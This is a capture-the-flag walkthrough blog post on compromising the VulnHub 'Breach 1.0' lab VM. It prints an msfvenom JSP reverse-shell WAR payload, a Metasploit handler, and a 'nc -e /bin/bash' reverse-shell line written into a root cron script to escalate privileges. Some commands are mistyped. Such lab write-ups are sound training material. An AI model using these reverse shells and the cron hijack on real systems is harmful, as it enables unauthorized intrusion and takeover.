<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Breach 1.0 VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-breach-1-0-vm-ctf-challenges/" rel="bookmark"><time class="entry-date published" datetime="2016-09-10T16:16:58+00:00">September 10, 2016</time><time class="updated" datetime="2025-06-10T20:30:35+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p style="text-align: justify;"><span style="color: #000000;">This time we are going to solve a fun VM i.e. Breach 1.0. Let’s find out what we already know about it:</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Breach 1.0 is a first VM in a multi-part series, it is meant to be for beginner to intermediate boot2root/CTF challenge. It is configured with a static IP address (192.168.110.140) so you will need to configure your host-only adaptor to this subnet.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>nmap -Pn 192.168.110.140</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-61QczON_aus/V9Qq9TcG0jI/AAAAAAAANms/KKYP_NY8N6EsaQk_8OCMXxtc561FAakoQCLcB/s1600/1.png"/></p>
<p><span style="color: #000000;">As you can see it has almost all the ports open that could only mean one thing i.e. an IDS is activated.</span></p>
<p><span style="color: #000000;">Now let’s start nikto :</span></p>
<p><span style="color: #000000;"><strong>nikto -h 192.168.110.140</strong></span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-4ToktfxPnQc/V9Qq-myCR7I/AAAAAAAANnA/L_i4OxzotK4zGbNPixg45cL5qa9__t8iQCEw/s1600/2.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Nikto proved to be useless in this case. So now let’s divert our attention to Port 80 which is most known and open so we will try by investigating the said port and do to so open the target IP into your browser.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-KlZkMTe-bfU/V9Qq_KB2VmI/AAAAAAAANnE/El_vHB7jy98hdK7YLnw4B--gWLxpeFo_QCEw/s1600/3.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">On the home page you will find an image with some dialogues/comments. Open the page source and you will find a base64 encoded code:</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-0HPHh3E8lEM/V9Qq_UrbgbI/AAAAAAAANnI/zH47iaESPZMUCzlqBctNymPSzEO9dKBvwCEw/s1600/4.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">&lt;! ——Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo —–&gt;</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Decode this code using a Add-On HackBar for Mozilla. Enable this Add-on and click on its Encoding tab then select Decode option. After this it will ask you for the string that you want to decode. Paste the code there and click on Ok</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-SO_P0XCpGCU/V9Qq_6Oxm7I/AAAAAAAANnM/6Z_sTOYUa7ghAIxDOQGYIX0o4pY2nCxaACEw/s1600/5.png"/></p>
<p><span style="color: #000000;">It will show the Base64 code again which means that the code has been encoded twice.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-V-ML7TaZ6ok/V9Qq_1b05SI/AAAAAAAANnQ/rXuABqziNMAxOPcgLasi50XrqZAnTUaWQCEw/s1600/6.png"/></p>
<p><span style="color: #000000;">Further decode it with the similar method and you will have one username and password.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-icsvCPWT4KM/V9QrAIrWxUI/AAAAAAAANnU/sVvo19R7l9Aylj_7mld50mAyoLQZ5ckLACEw/s1600/7.png"/></p>
<p><span style="color: #000000;">Now go back to the home page and click on the image. It will redirect you to another page.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-JkyrzAjUtJU/V9QrAnu0lAI/AAAAAAAANnY/CaF-GIfQGPcSyTsgkIFlkRljexXhP4hVQCEw/s1600/8.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">We tried and open every tab but found nothing except the Employee Portal tab. clicking on Employ Portal tab will open a log in page. Log into it by username and password that you have just decoded using Hack Bar.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-r2URCwlyzok/V9Qq9SODRxI/AAAAAAAANmw/tEGkedkUDjgtVQRftoiekBB3QiPbT2BKwCEw/s1600/10.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Once you are logged in, you will we that there are three messages in the inbox. Open each message one by one as we may find a clue in it.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-A8avobsMVwU/V9Qq9cTY0WI/AAAAAAAANmo/2pKvdfH92-ItCTuWwo9YDW3ygPgt6JlHACEw/s1600/11.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">In the first mail a user is simply sending a message to another user named peter. And as we found no clue in it we may move forward to the second mail.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-MqUnCRSsnR0/V9Qq94I8I_I/AAAAAAAANm4/ZCLD2xZ_BIA_my2sS0yP7U3RZ-E5ybgygCEw/s1600/12.png"/></p>
<p><span style="color: #000000;">Second mail is about IDS which confirms our suspicion about activated IDS.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-hZbHSS0ZBb8/V9Qq-O0d_DI/AAAAAAAANm0/5-1VVC_K35gfSNPOFVYZowjBOEO5dJjEwCEw/s1600/13.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Moving onto the third mail you will find that there is a URL mentioned and they are talking about a SSL certification. So let’s not wait any longer and open the URL first.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-PykwLZbzQ5U/V9Qq-efUekI/AAAAAAAANm8/GmpWaO7xhmgANhRdxBDvxuTv9Ft9AAZMwCEw/s1600/14.png"/></p>
<p><span style="color: #000000;">Opening the URL it will show a file to download. Download the file and save it.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-fKMDPeteZpE/V9QsOO0hPrI/AAAAAAAANno/HxsW5T5_gU0doyTOgn9rWmoqkjG5OMa4wCLcB/s1600/15.png"/></p>
<p><span style="color: #000000;">Now let’s look for SSL in the search bar and see what it has to offer.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-BwToq6IEfOw/V9QsOAPunTI/AAAAAAAANnk/_pqj-aQTxCgkjP2yM_4Nc2dTLWCyW9bggCEw/s1600/17.png"/></p>
<p><span style="color: #000000;">There is in fact an SSL certification present. Open it</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-6_MUz202X74/V9QsOMar57I/AAAAAAAANng/kM9CsVJy8WI3EpMqxOxlX5zsUAJZSl-BQCEw/s1600/18.png"/></p>
<p><span style="color: #000000;">In the SSL certificate you will find a URL.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-vTzN58hXIkI/V9QsOvXcycI/AAAAAAAANnw/NnorsO3JzRAF4I1KIjvLbBOidb51I5zeACEw/s1600/19.png"/></p>
<p><span style="color: #000000;">Similarly, open the URL and it will ask you to download a file.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-cRh40iwj2uE/V9QsOxfLHsI/AAAAAAAANns/x_j97xjWkdgaY_zQ4EJmzg_ysLN7r_IagCEw/s1600/20.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Once you have downloaded the file. Open it with wireshark</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Now that the file is opened, try to read it by right clicking on the file and then selecting <strong>follow &gt;&gt; TCP stream</strong>. This is a normal method to read it but as you can see via this method you can’t read the file as its encrypted and from earlier we know that SSL certificate will allow us to read it.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">But now the problem is that SSL option is not activated. So now we have to find a way to activate it. Let’s have look on the files that wireshark is providing. You can see that the most communication is taken place on the port 8443. This port is used for tomcat and the file we downloaded earlier, namely .keystore, might had all the certificates because we recall while downloading this keystore file mentioned something about tom cat which means our intuition is correct.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">Now doing a lot of research on internet on security stack we found the keystore’s proprietary format (called “JKS”) to standardized format PKCS12.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>keytool -importkeystore -srckeystore keystore -destkeystore mykeystore.p12 -deststoretype PKCS12 -srcalias tomcat</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">In passwords we have put tomcat as it the general default password. Now the file is ready to import.</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong> </strong>So, now to activate it simply go to <strong>Edit</strong> menu from the menu bar and select <strong>Preferences</strong> from the drop down menu.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">A dialog box will open, select <strong>protocols </strong>option and then select <strong>SSL</strong> and then click on <strong>Edit </strong>button.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-2UDQMUm8hOk/V9QsO-L2B5I/AAAAAAAANn0/ISmUlaEU2a4U5PAcV_mUSCDHomPjarmnQCEw/s1600/23.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Another dialog box will open. Here, give IP address of the target and port number 8443 along with the path of keystore file and the password.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-KcBDS_dHV10/V9QsPa7FkpI/AAAAAAAANn4/EqD7Vj-RgLwLB5i2w_NrJ0dd3mK2GrZkgCEw/s1600/24.png"/></p>
<p><span style="color: #000000;">Now we have activated SSL so <strong>right click</strong> on the file and choose the option <strong>Follow</strong> and then select <strong>SSL stream</strong>.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-TyiuPsBP4uA/V9QsPWtTv7I/AAAAAAAANn8/OAebOW1nvhEWxRI0bFBCnBlxq8Z9QGwPwCEw/s1600/25.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Finally, now you can read the file. In the file you will again find a <strong>base64 code</strong>. Decode it in the similar way using hack bar.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-wl8kSZy-a88/V9QsPpSO7oI/AAAAAAAANoA/0_NvVsq5Zi0z3z2Q5llaw2G7FGuBRiGJgCEw/s1600/26.png"/></p>
<p><span style="color: #000000;">Decoding it with the Hackbar will give you the username and password as the result.</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-JtiedzXRd4c/V9QsPz6fDnI/AAAAAAAANoE/IwB5yDi0z4Am7MR-LhLDfauSsF0PyYMDgCEw/s1600/27.png"/></p>
<p><span style="color: #000000;">Traversing the file on wireshark some more will show you and URL as shown:</span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-a-jfBq8WfDs/V9QsQEHSpXI/AAAAAAAANoI/BksqVw8RE1YFIHYw8wPmRkUHM_3aFmvVQCEw/s1600/28.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Opening this URL on the browser will open a software foundation page made in java. On this page you can find a browse option which means we can upload a malicious file here.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-hNkixwJlAKU/V9QsQbFgrgI/AAAAAAAANoM/9kHeWSs5C6AffYEvznjCZURhaTmQrtOuwCEw/s1600/29.png"/></p>
<p><span style="color: #000000;">So now let’s generate a mile through msfvenom which is compatible with java and for this type :</span></p>
<p><strong><span style="color: #000000;">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.128 LPORT=4444 -f war &gt; /root/Desktop/update.wa</span>r</strong></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-iG8fkx-xsMQ/V9QsQhijyEI/AAAAAAAANoQ/RMtC2US8DzgBcaPndMkGNo_ceWHDFuB2QCEw/s1600/30.png"/></p>
<p><span style="color: #000000;">Go to the browse option now and upload your file.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-RpeX6ca5ba4/V9QtOL1SoBI/AAAAAAAANoY/fQ04LH1gBFIX3HASetWIDZpomVru6rOXACLcB/s1600/31.png"/></p>
<p><span style="color: #000000;">The file is uploaded.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-v0B86EDjBus/V9QtOO7SnrI/AAAAAAAANoc/BvQ2ktofe6cEtIMbyX-J01IMiPNcSHMrwCEw/s1600/32.png"/></p>
<p>N<span style="color: #000000;">ow before clicking on the file open metasaploit and type ;</span></p>
<p><span style="color: #000000;"><strong> </strong><strong>use exploit/multi/handler</strong></span></p>
<p><span style="color: #000000;"><strong>set payload java/meterpreter/rever_tcp</strong></span></p>
<p><span style="color: #000000;"><strong>set lhost 192.168.110.128</strong></span></p>
<p><span style="color: #000000;"><strong>set lport 4444</strong></span></p>
<p><span style="color: #000000;"><strong>exploit</strong></span></p>
<p><span style="color: #000000;"><strong> </strong>Click the file once you hit enter and you will have you meterpreter’s session in no time.</span></p>
<p><span style="color: #000000;">Now go to the shell and import the python file to have the control of terminal and for that type :</span></p>
<p><span style="color: #000000;"><strong>shell</strong></span></p>
<pre class="highlight"><code>echo "import pty; pty.spawn('/bin/bash')" &gt; /tmp/asdf.py
python /tmp/asdf.py</code></pre>
<p><span style="color: #000000;"><strong> </strong>Once you reach the terminal type the following command to see the details:</span></p>
<p><span style="color: #000000;"><strong>ls -lsa</strong></span></p>
<p><span style="color: #000000;">As we found nothing in it we went back by typing :</span></p>
<p><span style="color: #000000;"><strong>cd ..</strong></span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-8jwvBvVWBAA/V9QtPhTKxnI/AAAAAAAANoo/oIS9VViB8E0H9uCLqYK5k-wskGGNZTAqwCEw/s1600/33.png"/></p>
<p><span style="color: #000000;">Then go to home and into the Milton and read the file which may have our flag. Do this with the following steps:</span></p>
<p><span style="color: #000000;"><strong>cd home</strong></span></p>
<p><span style="color: #000000;"><strong> </strong><strong>ls -lsa</strong></span></p>
<p><span style="color: #000000;"><strong> </strong><strong>cd milton </strong></span></p>
<p><span style="color: #000000;"><strong> </strong><strong>ls -lsa</strong></span></p>
<p><span style="color: #000000;"><strong> </strong><strong>cat some_script.sh</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-h-XgptFSuPw/V9QtSS6MDRI/AAAAAAAANo0/7q07BnCNvSos7smeLXrAZLly5b7PgpThgCEw/s1600/34.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">LOL! We are trolled as there was no flag here. Now that we found nothing here we were back to square one which means we then started search everything again thoroughly. And then we found an image called <strong>bill.png. </strong> </span></p>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-HyxQq3Lm1wo/V9QtPQ9KTBI/AAAAAAAANok/mpJoLglyDnUSoseRLuyKW8V52KxgmVucgCEw/s1600/35.png"/></p>
<p><span style="color: #000000;">We read it with <strong>exiftool </strong>by typing:</span></p>
<p><span style="color: #000000;"><strong>exiftool bill.png</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-7K8nyOujf9o/V9QtQBqG7kI/AAAAAAAANos/PM7kYXG8sM0GUjj1g-nTrHABr-66s-rIwCEw/s1600/36.png"/></p>
<p><span style="color: #000000;">We found a password here i.e.<strong> coffeestains</strong></span></p>
<p><span style="color: #000000;">Then go to the passwd file :</span></p>
<p><span style="color: #000000;"><strong>cat /etc/passwd</strong></span></p>
<p><span style="color: #000000;"><strong> </strong>Then su and give the password as coffeestains :</span></p>
<p><span style="color: #000000;"><strong>su blumbergh</strong></span></p>
<p><span style="color: #000000;"><strong> </strong>And then look for the ID’s by typing :</span></p>
<p><span style="color: #000000;"><strong>id</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-zsqqekMARrs/V9QtTdoAQfI/AAAAAAAANo8/HhbSt5NCCDILHSUjLVwXIkVPoRdir3KpgCEw/s1600/37.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">On further exploring you will find a file called <strong>/usr/share/cleanup/tidyup.sh</strong>.  It says in this file that it runs every three minutes in order to defend itself from hackers. So now, as we have root’s access we should be able to modify it and so type:</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>echo “nc -e /bin/bash 192.168.110.128 8443” &gt; shell.txt</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>cat /usr/bin/tee /usr/share/cleanup/tidyup.sh</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://1.bp.blogspot.com/-jl8d9PfePM0/V9QtRaEy5bI/AAAAAAAANow/exgD3UlBaLUjaQcz6Qs8H1kc6jqR-l9hgCEw/s1600/38.png"/></p>
<p><span style="color: #000000;">As they above commands have been executed, we will now need a listener to read our flag and for that type ;</span></p>
<p><span style="color: #000000;"><strong>nc -lvv -p 8443</strong></span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-Y0THrFkjfeo/V9QtSieqWoI/AAAAAAAANo4/OyO9CzYjC6kKVh_PAm-5XgALyOpqdm20QCEw/s1600/39.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contac</span>t <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
